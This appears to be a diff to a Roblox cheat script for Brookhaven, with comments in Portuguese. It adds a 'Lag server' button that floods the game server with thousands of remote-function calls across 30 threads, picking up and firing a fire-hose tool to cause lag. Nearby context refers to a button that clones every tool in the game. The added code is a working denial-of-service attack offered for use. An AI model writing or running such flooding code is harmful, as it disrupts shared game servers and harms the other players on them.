@@ -2260,6 +2260,51 @@ Lag:AddToggle({
     end
 })
 
+Lag:AddButton({ 
+    Name = "Lag server Negação",
+    Callback = function() 
+        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
+        local backpack = LocalPlayer:WaitForChild("Backpack") 
+        local remoteStorage = ReplicatedStorage:WaitForChild("RE") 
+        local toolRemote = remoteStorage:FindFirstChild("1Too1l") 
+        
+        if toolRemote and toolRemote:IsA("RemoteFunction") then 
+            local args1 = { "PickingTools" , "FireHose" } 
+            local args2 = { "FireHose" , "DestroyFireHose" } 
+            
+            for i = 1, 30 do 
+                task.spawn(function() 
+                    -- Aumentado para 289 requisições por ciclo
+                    for m = 1, 289 do 
+                        pcall(function() 
+                            toolRemote:InvokeServer(unpack(args1)) 
+                        end) 
+                        
+                        -- Alterado para 40 para suavizar as 39 requisições restantes do final
+                        if m % 40 == 0 then 
+                            task.wait() 
+                        end 
+                    end 
+                    
+                    task.spawn(function() 
+                        local fireHose = backpack:FindFirstChild("FireHose") or character:FindFirstChild("FireHose") 
+                        if fireHose then 
+                            local toolSound = fireHose:FindFirstChild("ToolSound") 
+                            if toolSound then 
+                                pcall(function() 
+                                    toolSound:FireServer(unpack(args2)) 
+                                end) 
+                            end 
+                        end 
+                    end) 
+                end) 
+                -- Pequena pausa entre os ciclos principais para estabilizar o FPS do cliente
+                task.wait(0.05) 
+            end 
+        end 
+    end 
+})
+
 -- Botão para Clonar todas as ferramentas do Brookhaven de uma vez só
 Lag:AddButton({
     Name = "Pegar Todas as Ferramentas",
